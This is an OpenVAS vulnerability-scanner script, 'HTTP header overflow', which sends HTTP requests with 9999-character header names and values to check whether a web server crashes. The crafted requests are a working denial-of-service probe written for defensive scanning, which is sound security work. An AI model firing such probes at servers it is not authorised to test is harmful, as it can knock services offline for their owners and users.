# OpenVAS Vulnerability Test
# $Id: www_too_long_header.nasl 3359 2016-05-19 13:40:42Z antu123 $
# Description: HTTP header overflow
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "It was possible to kill the web server by
sending an invalid request with a too long header name or value.

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.";

tag_solution = "upgrade your software or protect it with a filtering reverse proxy";

# I don't even know if it crashes any web server...

if(description)
{
 script_id(11078);
 script_version("$Revision: 3359 $");
 script_tag(name:"last_modification", value:"$Date: 2016-05-19 15:40:42 +0200 (Thu, 19 May 2016) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 
 # This probably matches
 script_cve_id("CVE-2000-0182");
 
 
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 name = "HTTP header overflow";
 script_name(name);
 

 summary = "Too long HTTP header kills the web server";
 script_summary(summary);
 
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
# All the www_too_long_*.nasl scripts were first declared as 
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before OpenVAS 
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Gain a shell remotely";
 script_family(family);
 script_require_ports("Services/www", 80);
 script_dependencies("find_service.nasl", "httpver.nasl", "http_version.nasl");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

########

include("http_func.inc");


port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

#
r= http_get(item:"/", port:port);
r= r - string("\r\n\r\n");
r= string(r, "\r\n", "OpenVAS-Header: ", crap(9999), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket:soc);
close(soc);
#
r= http_get(item:"/", port:port);
r= r - string("\r\n\r\n");
r= string(r, "\r\n", crap(9999), ": OpenVAS was here\r\n\r\n");

soc = http_open_socket(port);
if (! soc)  { security_message(port); exit(0); }

send(socket:soc, data: r);
r = http_recv(socket:soc);
close(soc);
#

if (http_is_dead(port: port)) { security_message(port); exit(0); }
